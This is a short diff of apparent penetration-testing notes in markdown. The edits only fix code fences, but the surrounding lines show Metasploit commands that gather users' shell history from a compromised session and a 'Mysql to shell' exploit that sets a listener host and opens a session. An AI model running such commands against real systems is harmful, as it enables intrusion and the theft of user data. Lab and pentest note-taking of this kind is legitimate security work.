@@ -6,7 +6,7 @@ use post/linux/gather/enum_users_history
 set SESSION 1
 run
 
-``
+```
 
 #### Mysql to shell
 
@@ -19,5 +19,5 @@ set TARGET 1
 set LHOST 192.73.96.2
 exploit
 session -i 2
-
 ```
+
